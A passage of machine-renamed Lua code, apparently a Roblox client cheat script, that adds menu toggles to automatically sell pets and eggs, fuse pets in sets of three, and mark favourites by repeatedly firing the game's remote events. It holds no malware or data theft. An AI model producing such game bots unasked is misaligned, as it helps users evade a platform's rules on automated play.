							v29 = type(v29) == "string" and v29
						end

						v29 = v29 or nil

						if v29 then
							tbl33[arg2 and arg2[v29] or v29] = true
						end
					end
				end

				return tbl33
			end

			local function fn36(arg)
				local directory2 = tbl.Assets and tbl.Assets.Directory
				local flag6 = type(directory2) == "table" and directory2[tostring(arg)] or nil
				local rarity = type(flag6) == "table" and flag6.Rarity or nil
				local flag7 = type(rarity) == "table"

				if flag7 then
					flag7 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag7 or math.huge
			end

			local function fn37(arg)
				local directory2 = tbl.Assets and tbl.Assets.Directory
				local flag6 = type(directory2) == "table" and directory2[tostring(arg.Category)] or nil
				local n22 = type(flag6) == "table" and tonumber(flag6.EarningRate) or 0
				local n23 = tonumber(arg.Scale) or 0
				if n22 <= 0 or n23 <= 0 then
					return 0
				end
				local n24 = n23 > 5 and (n23 / 5) ^ 1.2 * 19.637875755794113 or n23 ^ 1.85
				local mutations = tbl.Mutations
				local flag7 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n25 = 1

				if flag7 then
					local ok, result = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})

					if ok and type(result) == "number" then
						n25 = result
					end
				end

				return n22 * n24 * n25
			end

			local function fn38(arg)
				return type(arg) == "table" and next(arg) ~= nil
			end

			local function fn39()
				local save3 = tbl.Save
				if type(save3) ~= "table" or type(save3.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save3.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn40()
				local v29 = fn39()
				local tbl33 = {}
				if not v29 then
					return tbl33, 0
				end
				local tbl34 = {}
				local v30 = pairs
				local equippedAssets = v29.EquippedAssets or {}

				for _, equippedAsset in v30(equippedAssets) do
					tbl34[equippedAsset] = true
				end

				local v31 = pairs
				local inventory = v29.Inventory or {}
				local n22 = 0

				for k, v32 in v31(inventory) do
					local flag6 = type(v32) == "table" and v32.InFuse ~= true and v32.IsFavorite ~= true and not tbl34[k] and not tbl31[tostring(v32.Category)]

					if flag6 then
						flag6 = not (flag3 and fn38(v32.Mutations))
					end

					if flag6 then
						local v33 = fn37(v32)
						local flag7 = fn36(v32.Category) <= n17
						local flag8 = n18 > 0 and v33 < n18

						if v27 ~= tbl23[2] then
							if v27 == tbl23[3] then
								flag8 = flag7 and flag8
							elseif v27 ~= tbl23[4] then
								flag8 = flag7
							else
								flag8 = flag7 or flag8
							end
						end

						if flag8 then
							table.insert(tbl33, k)
							local flag9 = type(v23) == "table" and type(v23.SalePrice) == "function"
							local flag10 = false
							local result = nil

							if flag9 then
								flag10, result = pcall(v23.SalePrice, v32)
							end

							n22 += flag10 and tonumber(result) or v33 * 100
						end
					end
				end

				return tbl33, n22
			end

			local function fn41()
				local tbl33 = {}
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl33, 0
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl33, 0
				end
				local character = localPlayer.Character
				character = character and character:FindFirstChildWhichIsA("Tool")
				character = character and character:GetAttribute("UID") or nil
				local eggRecords = tbl.EggRecords
				local v29, v30, v31 = pairs(result)
				local n22 = 0

				for k, v32 in v29, v30, v31 do
					local flag6 = type(v32) == "table" and v32.Placement == nil and k ~= character and not tbl32[tostring(v32.AssetCategory)]

					if flag6 then
						flag6 = not (flag4 and fn38(v32.Mutations))
					end

					if flag6 then
						local v33 = fn37({ Category = v32.AssetCategory, Scale = v32.AssetScale, Mutations = v32.Mutations })
						local flag7 = fn36(v32.AssetCategory) <= n19
						local flag8 = n20 > 0 and v33 < n20
						local v34

						if v28 == tbl23[2] then
							v34 = flag8
						elseif v28 == tbl23[3] then
							v34 = flag7 and flag8
						elseif v28 ~= tbl23[4] then
							v34 = flag7
						else
							v34 = flag7 or flag8
						end

						if v34 then
							table.insert(tbl33, k)

							if type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
								local ok2, result2 = pcall(eggRecords.SellPrice, v32)
								n22 += ok2 and tonumber(result2) or 0
							end
						end
					end
				end

				return tbl33, n22
			end

			local function fn42(arg, arg2)
				local rePetSatchelSellSelection = networking:FindFirstChild("RE/PetSatchel/SellSelection")
				if not rePetSatchelSellSelection or not rePetSatchelSellSelection:IsA("RemoteEvent") then
					return false
				end
				local n22 = math.max(#arg, #arg2)
				local n23 = 1

				while n23 <= n22 do
					local tbl33 = {}
					local tbl34 = {}

					for i = n23, n23 + n16 - 1 do
						if arg[i] then
							table.insert(tbl33, arg[i])
						end

						if arg2[i] then
							table.insert(tbl34, arg2[i])
						end
					end

					pcall(rePetSatchelSellSelection.FireServer, rePetSatchelSellSelection, { Eggs = tbl34, Assets = tbl33 })
					n23 += n16

					if n23 <= n22 then
						task.wait(0.3)
					end
				end

				return true
			end

			local function fn43(arg, arg2)
				if flag5 or #arg == 0 and #arg2 == 0 then
					return
				end
				flag5 = true
				n21 = os.clock() + n15

				task.spawn(function()
					pcall(fn42, arg, arg2)
					flag5 = false
					tbl3.Wake()
				end)
			end

			tbl3.Add(function()
				local v29 = tbl4.Toggle(v24, false)
				local v30 = tbl4.Toggle(v22, false)
				local v31, v32 = fn40()
				local v33, v34 = fn41()

				if v25 and type(v25.Set) == "function" then
					pcall(v25.Set, v25, string.format("Pet matches  -  %d pets for %s", #v31, fn34(v32)))
				end

				if v26 and type(v26.Set) == "function" then
					pcall(v26.Set, v26, string.format("Egg matches  -  %d eggs for %s", #v33, fn34(v34)))
				end

				local flag6 = flag5 or os.clock() < n21
				local flag7

				if flag6 then
					flag7 = flag6
				else
					flag7 = not (v29 or v30)
				end

				if flag7 then
					return false
				end
				fn43(v29 and v31 or {}, v30 and v33 or {})
				return false
			end)

			v25 = v12:CreateText({ Name = "Pet Sell Preview", Text = "Pet matches  -  0 pets" })

			v24 = v12:CreateToggle({
				Name = "Auto Sell Pet",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v12:CreateButton({
				Name = "Sell Pets Now",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = v24,
				Callback = function()
					fn43(fn40(), {})
				end,
			})

			v12:CreateDropdown({
				Name = "Sell Pet Rule",
				Note = "Which checks must pass to sell",
				Options = tbl23,
				Default = tbl23[1],
				SubOf = v24,
				Callback = function(arg)
					if table.find(tbl23, arg) then
						v27 = arg
						tbl3.Wake()
					end
				end,
			})

			v12:CreateDropdown({
				Name = "Pet Max Rarity",
				Note = "Sell pets at or below this rarity",
				Options = tbl24,
				Default = fn33(3),
				SubOf = v24,
				Callback = function(arg)
					n17 = tbl25[arg] or n17
					tbl3.Wake()
				end,
			})

			local tbl33 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local function fn44(arg, arg2, arg3, arg4)
				local n22 = 0
				local str3 = "M/s"

				local function fn45(arg5, arg6)
					if arg5 ~= nil then
						n22 = math.max(0, math.floor(tonumber(arg5) or n22))
					end

					if arg6 ~= nil then
						str3 = tostring(arg6)
					end

					arg4(n22 * (tbl33[str3] or tbl33["M/s"]).Mult)
					tbl3.Wake()
				end

				return (fn5(v12, {
					Name = arg == "Pet Value Threshold" and "Pet Sell Value" or arg == "Egg Value Threshold" and "Egg Sell Value" or arg,
					Note = arg2,
					SubOf = arg3,
					Legacy = arg,
					SectionName = "Auto Sell",
					OnRaw = function(arg5)
						fn45(math.floor(arg5 / 1000), "K/s")
					end,
				}))
			end

			fn44("Pet Value Threshold", "Sell pets worth less than this (0 = off)", v24, function(arg)
				n18 = arg
			end)

			local v29 = nil

			v29 = v12:CreateToggle({
				Name = "Keep Mutated Pets",
				Note = "Never sell mutated pets",
				Default = true,
				SubOf = v24,
				Callback = function()
					flag3 = tbl4.Toggle(v29, true)
					tbl3.Wake()
				end,
			})

			fn6(v12:CreateMultiDropdown({
				Name = "Blacklist Sell Pets",
				Note = "These pets are never sold",
				Options = tbl26,
				Default = {},
				SubOf = v24,
				Callback = function(arg)
					tbl31 = fn35(arg, tbl27)
					tbl3.Wake()
				end,
			}))

			v26 = v12:CreateText({ Name = "Egg Sell Preview", Text = "Egg matches  -  0 eggs" })

			v22 = v12:CreateToggle({
				Name = "Auto Sell Egg",
				Note = "Sell bag eggs matching the rules below",
				Default = false,
				Callback = function()
					tbl3.Wake()
				end,
			})

			v12:CreateButton({
				Name = "Sell Eggs Now",
				Note = "Sell matching eggs once",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = v22,
				Callback = function()
					local v30 = fn41()
					fn43({}, v30)
				end,
			})

			v12:CreateDropdown({
				Name = "Sell Egg Rule",
				Note = "Which checks must pass to sell",
				Options = tbl23,
				Default = tbl23[1],
				SubOf = v22,
				Callback = function(arg)
					if table.find(tbl23, arg) then
						v28 = arg
						tbl3.Wake()
					end
				end,
			})

			v12:CreateDropdown({
				Name = "Egg Max Rarity",
				Note = "Sell eggs at or below this rarity",
				Options = tbl24,
				Default = fn33(3),
				SubOf = v22,
				Callback = function(arg)
					n19 = tbl25[arg] or n19
					tbl3.Wake()
				end,
			})

			fn44("Egg Value Threshold", "Sell eggs worth less than this (0 = off)", v22, function(arg)
				n20 = arg
			end)

			local v30 = nil

			v30 = v12:CreateToggle({
				Name = "Keep Mutated Eggs",
				Note = "Never sell mutated eggs",
				Default = true,
				SubOf = v22,
				Callback = function()
					flag4 = tbl4.Toggle(v30, true)
					tbl3.Wake()
				end,
			})

			fn6(v12:CreateMultiDropdown({
				Name = "Blacklist Sell Eggs",
				Note = "These eggs are never sold",
				Options = tbl26,
				Default = {},
				SubOf = v22,
				Callback = function(arg)
					tbl32 = fn35(arg, tbl27)
					tbl3.Wake()
				end,
			}))
		end

		local save3 = tbl.Save

		if type(save3) == "table" and type(save3.FieldSignal) == "function" then
			for _, v23 in ipairs({ "Inventory", "EggInventory", "EquippedAssets" }) do
				local ok, result = pcall(save3.FieldSignal, v23)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local n16
		n16 = 2
		local n17
		n17 = 3
		local n18
		n18 = 20
		local tbl28
		tbl28 = { "Lowest Rarity First", "Highest Rarity First", "Most Copies First", "Lowest Value First" }
		local tbl29
		tbl29 = { "Lowest To Highest", "Highest To Lowest" }
		local tbl30
		tbl30 = {}
		local tbl31
		tbl31 = {}
		local tbl32
		tbl32 = {}
		local tbl33
		tbl33 = {}

		do
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl34 = {}
			local tbl35 = {}

			if type(directory) == "table" then
				for k, v23 in pairs(directory) do
					local rarity = type(v23) == "table" and v23.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag3 = flag3 or nil

					if flag3 then
						local str3 = tostring(rarity.DisplayName or rarity._id or flag3)
						tbl34[flag3] = tbl34[flag3] or str3

						table.insert(tbl35, {
							Category = tostring(k),
							Name = tostring(v23.DisplayName or k),
							Rarity = flag3,
							RarityName = str3,
						})
					end
				end
			end

			local tbl36 = {}

			for k in pairs(tbl34) do
				table.insert(tbl36, k)
			end

			table.sort(tbl36)

			for _, v23 in ipairs(tbl36) do
				local str3 = string.format("%d - %s", v23, tbl34[v23])
				table.insert(tbl30, str3)
				tbl31[str3] = v23
			end

			table.sort(tbl35, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v23 in ipairs(tbl35) do
				local str3 = string.format("%s [%s]", v23.Name, v23.RarityName)

				if tbl33[str3] then
					str3 = string.format("%s [%s] (%s)", v23.Name, v23.RarityName, v23.Category)
				end

				table.insert(tbl32, str3)
				tbl33[str3] = v23.Category
			end
		end

		do
			local function fn33(arg)
				for _, v23 in ipairs(tbl30) do
					if tbl31[v23] == arg then
						return v23
					end
				end

				return tbl30[#tbl30]
			end

			local v23 = nil
			local v24 = nil
			local v25 = tbl28[1]
			local v26 = tbl29[1]
			local n19 = 6
			local tbl34 = {}
			local flag3 = true
			local flag4 = true
			local flag5 = false
			local n20 = 0
			local n21 = 0
			local n22 = 0
			local tbl35 = {}

			local function fn34(arg, arg2)
				local v27 = networking:FindFirstChild(arg)
				if not v27 or not v27:IsA("RemoteFunction") then
					return false, nil
				end

				if arg2 == nil then
					return pcall(v27.InvokeServer, v27)
				end
				return pcall(v27.InvokeServer, v27, arg2)
			end

			local function fn35()
				local save4 = tbl.Save
				if type(save4) ~= "table" or type(save4.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save4.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn36(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				return type(directory) == "table" and directory[tostring(arg)] or nil
			end

			local function fn37(arg)
				local v27 = fn36(arg)
				local rarity = type(v27) == "table" and v27.Rarity or nil
				local flag6 = type(rarity) == "table"

				if flag6 then
					flag6 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag6 or math.huge
			end

			local function fn38(arg)
				local v27 = fn36(arg)
				return tostring(type(v27) == "table" and v27.DisplayName or arg)
			end

			local function fn39(arg)
				local v27 = fn36(arg.Category)
				local n23 = type(v27) == "table" and tonumber(v27.EarningRate) or 0
				local n24 = tonumber(arg.Scale) or 0
				if n23 <= 0 or n24 <= 0 then
					return 0
				end
				local n25 = n24 > 5 and (n24 / 5) ^ 1.2 * 19.637875755794113 or n24 ^ 1.85
				local mutations = tbl.Mutations
				local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n26 = 1

				if flag6 then
					local ok
					ok, n26 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n26) == "number"
					local n27 = 1

					if not ok then
						n26 = n27
					end
				end

				return n23 * n25 * n26
			end

			local function fn40(arg)
				return type(arg) == "table" and next(arg) ~= nil
			end

			local function fn41(arg)
				local n23 = tonumber(arg) or 0
				local tbl36 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n24 = 1

				while math.abs(n23) >= 1000 and n24 < #tbl36 do
					n23 /= 1000
					n24 += 1
				end

				return string.format(n24 == 1 and "$%.0f%s" or "$%.2f%s", n23, tbl36[n24])
			end

			local function fn42(arg)
				local fuseKernel = tbl.FuseKernel
				if type(fuseKernel) ~= "table" or type(fuseKernel.PriceFor) ~= "function" then
					return nil
				end
				local ok, result = pcall(fuseKernel.PriceFor, arg)
				return ok and tonumber(result) or nil
			end

			local function fn43(arg, arg2, arg3)
				local flag6 = type(arg2) == "table" and arg2.IsFavorite ~= true and not arg3[arg] and fn37(arg2.Category) <= n19 and (next(tbl34) == nil or tbl34[tostring(arg2.Category)] == true)

				if flag6 then
					flag6 = not (flag3 and fn40(arg2.Mutations))
				end

				if flag6 then
					flag6 = (tbl35[arg] or 0) <= os.clock()
				end

				return flag6
			end

			local function fn44(arg)
				local inventory = type(arg.Inventory) == "table" and arg.Inventory or {}
				local tbl36 = {}
				local v27 = pairs
				local equippedAssets = arg.EquippedAssets or {}

				for _, equippedAsset in v27(equippedAssets) do
					tbl36[equippedAsset] = true
				end

				local tbl37 = {}
				local tbl38 = {}

				for i = 1, 3 do
					local flag6 = type(arg.FusionSlots) == "table" and arg.FusionSlots[i] or nil

					if flag6 ~= nil and type(inventory[flag6]) == "table" then
						table.insert(tbl37, flag6)
						tbl38[flag6] = true
					end
				end

				local tbl39 = {}

				for k, v28 in pairs(inventory) do
					if not tbl38[k] and type(v28) == "table" and v28.InFuse ~= true and fn43(k, v28, tbl36) then
						local str3 = tostring(v28.Category)
						tbl39[str3] = tbl39[str3] or {}
						table.insert(tbl39[str3], { Uid = k, Item = v28, Income = fn39(v28) })
					end
				end

				local function fn45(arg2)
					table.sort(arg2, function(arg3, arg4)
						if arg3.Income ~= arg4.Income then
							if v26 == tbl29[2] then
								return arg3.Income > arg4.Income
							end
							return arg3.Income < arg4.Income
						end

						return tostring(arg3.Uid) < tostring(arg4.Uid)
					end)
				end

				if #tbl37 > 0 then
					local str3 = tostring(inventory[tbl37[1]].Category)
					local flag6 = true

					for _, v28 in ipairs(tbl37) do
						local v29 = inventory[v28]

						if tostring(v29.Category) ~= str3 or not fn43(v28, v29, tbl36) then
							flag6 = false
						end
					end

					local tbl40 = tbl39[str3] or {}

					if flag6 and #tbl37 + #tbl40 >= 3 then
						fn45(tbl40)
						local tbl41 = { Category = str3, Load = {}, Items = {} }

						for _, v28 in ipairs(tbl37) do
							table.insert(tbl41.Items, inventory[v28])
						end

						for i = 1, 3 - #tbl37 do
							table.insert(tbl41.Load, tbl40[i].Uid)
							table.insert(tbl41.Items, tbl40[i].Item)
						end

						return tbl41
					end

					if flag4 then
						return { Category = str3, Eject = tbl37 }
					end
					return nil, "Machine holds pets that cannot finish a fuse"
				end

				local v28 = nil
				local v29 = nil

				for k, v30 in pairs(tbl39) do
					if #v30 >= 3 then
						local v31 = fn37(k)
						local n23 = 0

						for _, v32 in ipairs(v30) do
							n23 += v32.Income
						end

						local tbl40

						if v25 == tbl28[2] then
							tbl40 = { -v31, -#v30 }
						elseif v25 == tbl28[3] then
							tbl40 = { -#v30, v31 }
						elseif v25 == tbl28[4] then
							tbl40 = { n23 / #v30, v31 }
						else
							tbl40 = { v31, -#v30 }
						end

						if v28 == nil or tbl40[1] < v28[1] or tbl40[1] == v28[1] and (tbl40[2] < v28[2] or tbl40[2] == v28[2] and k < v29) then
							v28 = tbl40
							v29 = k
						end
					end
				end

				if not v29 then
					return nil, "No three matching pets"
				end
				local v30 = tbl39[v29]
				fn45(v30)
				local tbl40 = { Category = v29, Load = {}, Items = {} }

				for i = 1, 3 do
					table.insert(tbl40.Load, v30[i].Uid)
					table.insert(tbl40.Items, v30[i].Item)
				end

				return tbl40
			end

			local function fn45(arg)
				local v27 = fn35()
				if not v27 then
					return
				end

				if v27.FusionLocked == true then
					if type(v27.FusionEggReward) == "table" and os.clock() >= n22 then
						n22 = os.clock() + n17
						fn34("RF/Fusery/FinishReveal")
					end

					return
				end

				local v28 = fn44(v27)
				if not v28 then
					return
				end

				if v28.Eject then
					for _, v29 in ipairs(v28.Eject) do
						if arg ~= n20 then
							return
						end
						fn34("RF/Fusery/EjectPet", v29)
						task.wait(0.35)
					end

					return
				end

				local v29 = fn42(v28.Items)
				local num = tonumber(v27.Money)
				if v29 and num and num < v29 then
					return
				end

				for _, v30 in ipairs(v28.Load) do
					if arg ~= n20 then
						return
					end
					local LoadPet, v31 = fn34("RF/Fusery/LoadPet", v30)
					if not LoadPet or v31 == false then
						tbl35[v30] = os.clock() + n18
						return
					end
					task.wait(0.35)
				end

				if arg ~= n20 then
					return
				end
				local BeginFuse, v30 = fn34("RF/Fusery/BeginFuse")

				if BeginFuse and v30 ~= false then
					n22 = os.clock() + n17
				end
			end

			local function fn46(arg)
				if not arg then
					return "Fuse status unknown"
				end

				if arg.FusionLocked == true then
					return "Machine is fusing, waiting for the egg"
				end
				local v27, v28 = fn44(arg)
				if not v27 then
					return v28 or "No three matching pets"
				end

				if v27.Eject then
					return string.format("Would eject %d %s that cannot finish a fuse", #v27.Eject, fn38(v27.Category))
				end
				local v29 = fn42(v27.Items)
				local num = tonumber(arg.Money)
				local str3 = v29 and num and num < v29 and "  (not enough money)" or ""
				return string.format("Next fuse  -  3 %s for %s%s", fn38(v27.Category), v29 and fn41(v29) or "?", str3)
			end

			tbl3.Add(function()
				local v27 = fn35()

				if v24 and type(v24.Set) == "function" then
					pcall(v24.Set, v24, fn46(v27))
				end

				if not tbl4.Toggle(v23, false) or flag5 or os.clock() < n21 then
					return false
				end
				flag5 = true
				n21 = os.clock() + n16
				local v28 = n20

				task.spawn(function()
					pcall(fn45, v28)
					flag5 = false
					tbl3.Wake()
				end)

				return false
			end)

			v24 = v13:CreateText({ Name = "Fuse Preview", Text = "Fuse status unknown" })

			v23 = v13:CreateToggle({
				Name = "Auto Fuse Machine",
				Note = "Fuse 3 same pets into an egg, nonstop",
				Default = false,
				Callback = function()
					n20 += 1
					table.clear(tbl35)
					n21 = 0
					tbl3.Wake()
				end,
			})

			v13:CreateDropdown({
				Name = "Fuse Priority Mode",
				Options = tbl28,
				Default = tbl28[1],
				SubOf = v23,
				Callback = function(arg)
					if table.find(tbl28, arg) then
						v25 = arg
						tbl3.Wake()
					end
				end,
			})

			v13:CreateDropdown({
				Name = "Pets To Use",
				Options = tbl29,
				Default = tbl29[1],
				SubOf = v23,
				Callback = function(arg)
					if table.find(tbl29, arg) then
						v26 = arg
						tbl3.Wake()
					end
				end,
			})

			v13:CreateDropdown({
				Name = "Max Rarity to Fuse",
				Options = tbl30,
				Default = fn33(6),
				SubOf = v23,
				Callback = function(arg)
					n19 = tbl31[arg] or n19
					tbl3.Wake()
				end,
			})

			fn6(v13:CreateMultiDropdown({
				Name = "Specific Species to Fuse",
				Note = "Only fuse these species (empty = all)",
				Options = tbl32,
				Default = {},
				SubOf = v23,
				Callback = function(arg)
					local tbl36 = {}

					if type(arg) == "table" then
						for k, v27 in pairs(arg) do
							k = v27 == true and type(k) == "string" and k
							local flag6

							if k then
								flag6 = k
							else
								flag6 = type(v27) == "string" and v27
							end

							flag6 = flag6 or nil

							if flag6 and tbl33[flag6] then
								tbl36[tbl33[flag6]] = true
							end
						end
					end

					tbl34 = tbl36
					tbl3.Wake()
				end,
			}))

			local v27 = nil

			v27 = v13:CreateToggle({
				Name = "Skip Mutated Pets",
				Default = true,
				SubOf = v23,
				Callback = function()
					flag3 = tbl4.Toggle(v27, true)
					tbl3.Wake()
				end,
			})

			local v28 = nil

			v28 = v13:CreateToggle({
				Name = "Eject Incomplete Slots",
				Note = "Take out pets that can't make a set",
				Default = true,
				SubOf = v23,
				Callback = function()
					flag4 = tbl4.Toggle(v28, true)
					tbl3.Wake()
				end,
			})
		end

		local save4 = tbl.Save

		if type(save4) == "table" and type(save4.FieldSignal) == "function" then
			for _, v23 in ipairs({
				"Inventory",
				"EquippedAssets",
				"FusionSlots",
				"FusionLocked",
				"FusionEggReward",
				"Money",
			}) do
				local ok, result = pcall(save4.FieldSignal, v23)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local n19
		n19 = 2
		local n20
		n20 = 25
		local n21
		n21 = 4
		local tbl34
		tbl34 = { "Match Any", "Match All" }
		local str3, tbl35, tbl36, tbl37, tbl38, tbl39, tbl40

		do
			local tbl41 = { "Golden", "Silver", "Rainbow", "Boss", "Monstrous", "Sakura", "GreatBloom" }
			str3 = "Any Mutation"
			tbl35 = { "Off" }
			tbl36 = {}
			tbl37 = {}
			tbl38 = {}
			tbl39 = { "Any Mutation" }
			tbl40 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl42 = {}
			local tbl43 = {}

			if type(directory) == "table" then
				for k, v23 in pairs(directory) do
					local rarity = type(v23) == "table" and v23.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag3 = flag3 or nil

					if flag3 then
						local str4 = tostring(rarity.DisplayName or rarity._id or flag3)
						tbl42[flag3] = tbl42[flag3] or str4

						table.insert(tbl43, {
							Category = tostring(k),
							Name = tostring(v23.DisplayName or k),
							Rarity = flag3,
							RarityName = str4,
						})
					end
				end
			end

			local tbl44 = {}

			for k in pairs(tbl42) do
				table.insert(tbl44, k)
			end

			table.sort(tbl44)

			for _, v23 in ipairs(tbl44) do
				local str4 = string.format("%d - %s", v23, tbl42[v23])
				table.insert(tbl35, str4)
				tbl36[str4] = v23
			end

			table.sort(tbl43, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v23 in ipairs(tbl43) do
				local str4 = string.format("%s [%s]", v23.Name, v23.RarityName)

				if tbl38[str4] then
					str4 = string.format("%s [%s] (%s)", v23.Name, v23.RarityName, v23.Category)
				end

				table.insert(tbl37, str4)
				tbl38[str4] = v23.Category
			end

			local tbl45 = {}
			local mutations = tbl.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(tbl45, tostring(k))
				end
			end

			if #tbl45 == 0 then
				tbl45 = table.clone(tbl41)
			end

			table.sort(tbl45, function(arg, arg2)
				return fn7(arg) < fn7(arg2)
			end)

			for _, v23 in ipairs(tbl45) do
				local v24 = fn7(v23)
				table.insert(tbl39, v24)
				tbl40[v24] = v23
			end
		end

		do
			local v23 = nil
			local v24 = nil
			local v25 = nil
			local createText = nil
			local v26 = tbl34[2]
			local v27 = nil
			local flag3 = false
			local tbl41 = {}
			local n22 = 0
			local tbl42 = {}
			local flag4 = false
			local n23 = 0
			local tbl43 = {}

			local function fn33()
				local save5 = tbl.Save
				if type(save5) ~= "table" or type(save5.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save5.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn34(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				return type(directory) == "table" and directory[tostring(arg)] or nil
			end

			local function fn35(arg)
				local v28 = fn34(arg)
				local rarity = type(v28) == "table" and v28.Rarity or nil
				local flag5 = type(rarity) == "table"

				if flag5 then
					flag5 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag5 or 0
			end

			local function fn36(arg)
				local v28 = fn34(arg.Category)
				local n24 = type(v28) == "table" and tonumber(v28.EarningRate) or 0
				local n25 = tonumber(arg.Scale) or 0
				if n24 <= 0 or n25 <= 0 then
					return 0
				end
				local n26 = n25 > 5 and (n25 / 5) ^ 1.2 * 19.637875755794113 or n25 ^ 1.85
				local mutations = tbl.Mutations
				local flag5 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n27 = 1

				if flag5 then
					local ok
					ok, n27 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					local flag6 = ok and type(n27) == "number"
					local n28 = 1

					if not flag6 then
						n27 = n28
					end
				end

				return n24 * n26 * n27
			end

			local function fn37(arg)
				local tbl44 = {}

				if type(arg.Mutations) == "table" then
					for k, mutation in pairs(arg.Mutations) do
						if type(mutation) == "string" then
							tbl44[mutation] = true
						elseif mutation == true and type(k) == "string" then
							tbl44[k] = true
						end
					end
				end

				if type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
					tbl44[arg.BaseMutation] = true
				end

				return tbl44
			end

			local function fn38(arg)
				if tbl42[tostring(arg.Category)] then
					return true
				end
				local n24 = 0
				local n25 = 0

				if v27 then
					n24 = 1

					if v27 <= fn35(arg.Category) then
						n25 = 1
					end
				end

				if flag3 or next(tbl41) ~= nil then
					n24 += 1
					local v28 = fn37(arg)

					if flag3 and next(v28) ~= nil then
						n25 += 1
					else
						local flag5 = false

						for k in pairs(v28) do
							if tbl41[k] then
								flag5 = true
								break
							end
						end

						if flag5 then
							n25 += 1
						end
					end
				end

				if n22 > 0 then
					n24 += 1

					if n22 <= fn36(arg) then
						n25 += 1
					end
				end

				if n24 == 0 then
					return false
				end

				if v26 == tbl34[2] then
					return n25 == n24
				end
				return n25 > 0
			end

			local function fn39(arg)
				return (tbl43[arg] or 0) > os.clock()
			end

			local function fn40(arg)
				local tbl44 = {}
				local v28, v29, v30 = pairs(arg.Inventory or {})
				local n24 = 0

				for k, v31 in v28, v29, v30 do
					if type(v31) == "table" and fn38(v31) then
						n24 += 1

						if v31.IsFavorite ~= true and not fn39(k) then
							table.insert(tbl44, k)
						end
					end
				end

				return tbl44, n24
			end

			local function fn41(arg, arg2, arg3)
				local tbl44 = {}
				local inventory = arg.Inventory or {}
				local v28 = pairs
				local equippedAssets = arg.EquippedAssets or {}

				for _, equippedAsset in v28(equippedAssets) do
					local v29 = inventory[equippedAsset]

					if type(v29) == "table" and not fn39(equippedAsset) then
						if arg2 then
							if v29.IsFavorite ~= true then
								table.insert(tbl44, equippedAsset)
							end
						else
							local flag5 = v29.IsFavorite == true

							if flag5 then
								flag5 = not (arg3 and fn38(v29))
							end

							if flag5 then
								table.insert(tbl44, equippedAsset)
							end
						end
					end
				end

				return tbl44
			end

			local function fn42(arg, arg2)
				local rePetSatchelWriteFavourite = networking:FindFirstChild("RE/PetSatchel/WriteFavourite")
				if not rePetSatchelWriteFavourite or not rePetSatchelWriteFavourite:IsA("RemoteEvent") then
					return
				end

				for i, v28 in ipairs(arg) do
					if not (n20 < i) then
						tbl43[v28] = os.clock() + n21
						pcall(rePetSatchelWriteFavourite.FireServer, rePetSatchelWriteFavourite, v28, arg2)
						task.wait(0.12)
						continue
					end

					break
				end
			end

			local function fn43(arg, arg2)
				local v28 = flag4
				local flag5

				if flag4 then
					flag5 = v28
				else
					flag5 = #arg == 0
				end

				if flag5 then
					return false
				end
				flag4 = true
				n23 = os.clock() + n19

				task.spawn(function()
					pcall(fn42, arg, arg2)
					flag4 = false
					tbl3.Wake()
				end)

				return true
			end

			tbl3.Add(function()
				local v28 = fn33()
				if not v28 then
					return false
				end
				local v29 = tbl4.Toggle(v23, false)
				local v30, v31 = fn40(v28)

				if createText and type(createText.Set) == "function" then
					local v32 = pairs
					local inventory = v28.Inventory or {}
					local n24 = 0

					for _, v33 in v32(inventory) do
